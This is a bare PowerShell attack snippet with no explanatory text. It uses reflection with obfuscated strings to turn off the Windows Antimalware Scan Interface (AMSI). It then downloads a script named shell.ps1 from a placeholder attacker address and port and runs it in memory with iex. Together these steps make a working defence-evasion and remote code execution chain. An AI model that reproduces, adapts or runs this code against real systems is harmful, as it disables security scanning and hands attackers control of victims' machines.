$a = [Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils')
$b = $a.GetField('amsi'+'InitFailed','NonPublic,Static')
$b.SetValue($null,$true)

$wc = New-Object ('Net.Web'+'Client')
$code = $wc.('Down'+'loadString')('http://$Attack_ip:$PORT/shell.ps1')
iex $code
